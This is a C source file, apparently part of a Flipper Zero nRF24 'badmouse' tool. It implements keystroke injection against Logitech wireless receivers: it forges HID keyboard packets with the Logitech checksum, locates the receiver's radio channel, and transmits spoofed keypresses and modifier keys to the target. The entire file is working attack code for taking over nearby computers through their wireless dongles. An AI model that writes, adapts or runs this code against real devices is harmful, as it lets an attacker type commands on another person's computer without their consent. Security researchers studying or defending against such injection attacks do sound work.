#include "badmouse_hid.h"

static uint8_t LOGITECH_HID_TEMPLATE[] = {0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static uint8_t LOGITECH_HELLO[] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
//static uint8_t LOGITECH_KEEPALIVE[] = {0x00, 0x40, 0x00, 0x55, 0x6B};

uint8_t prev_hid = 0;
static bool holding_ctrl = false;
static bool holding_shift = false;
static bool holding_alt = false;
static bool holding_gui = false;

#define RT_THRESHOLD               50
#define LOGITECH_MIN_CHANNEL       2
#define LOGITECH_MAX_CHANNEL       83
#define LOGITECH_KEEPALIVE_SIZE    5
#define LOGITECH_HID_TEMPLATE_SIZE 10
#define LOGITECH_HELLO_SIZE        10


static void checksum(uint8_t* payload, size_t len) {
    // This is also from the KeyKeriki paper
    // Thanks Thorsten and Max!
    uint8_t cksum = 0xff;
    for(size_t n = 0; n < len - 2; n++)
        cksum = (cksum - payload[n]) & 0xff;
    cksum = (cksum + 1) & 0xff;
    payload[len - 1] = cksum;
}

bool find_channeannel(Nrf24Tool* context) {
    uint8_t min_channel = context->settings->badmouse_settings[BADMOUSE_SETTING_MIN_CHANNEL].value.u8;
    uint8_t max_channel = context->settings->badmouse_settings[BADMOUSE_SETTING_MAX_CHANNEL].value.u8;
    uint8_t channel = nrf24_find_channel(
        badmouse_config.tx_addr, badmouse_config.tx_addr, badmouse_config.mac_len, badmouse_config.data_rate, min_channel, max_channel);
    if(channel <= max_channel) {
        badmouse_config.channel = channel;
        return true;
    }
    return false;
}

static bool inject_packet(Nrf24Tool* context, uint8_t* payload, size_t payload_size) {
    if(nrf24_txpacket(payload, payload_size, false)) {
        return true;
    }
    // retransmit threshold exceeded, scan for new channel
    if(find_channeannel(context)) {
        if(nrf24_txpacket(payload, payload_size, false)) {
            return true;
        }
    }
    return false;
}

static void build_hid_packet(uint8_t mod, uint8_t hid, uint8_t* payload) {
    memcpy(payload, LOGITECH_HID_TEMPLATE, LOGITECH_HID_TEMPLATE_SIZE);
    payload[2] = mod;
    payload[3] = hid;
    checksum(payload, LOGITECH_HID_TEMPLATE_SIZE);
}

static void release_key(Nrf24Tool* context) {
    // This function release keys currently pressed, but keep pressing special keys
    // if holding mod keys variable are set to true

    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
    build_hid_packet(0 | holding_ctrl | holding_shift << 1 | holding_alt << 2 | holding_gui << 3, 0, hid_payload);
    inject_packet(context, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet
}

bool send_hid_packet(Nrf24Tool* context, uint8_t mod, uint8_t hid) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
    if(hid == prev_hid) release_key(context);

    prev_hid = hid;
    build_hid_packet(
        mod | holding_ctrl | holding_shift << 1 | holding_alt << 2 | holding_gui << 3,
        hid,
        hid_payload);
    if(!inject_packet(context, hid_payload, LOGITECH_HID_TEMPLATE_SIZE))
        return false;
    furi_delay_ms(12);
    return true;
}

bool start_transmission(Nrf24Tool* context) {
    return inject_packet(context, LOGITECH_HELLO, LOGITECH_HELLO_SIZE);
}

bool end_transmission(Nrf24Tool* context) {
    uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
    build_hid_packet(0, 0, hid_payload);
    return inject_packet(context, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet at end
}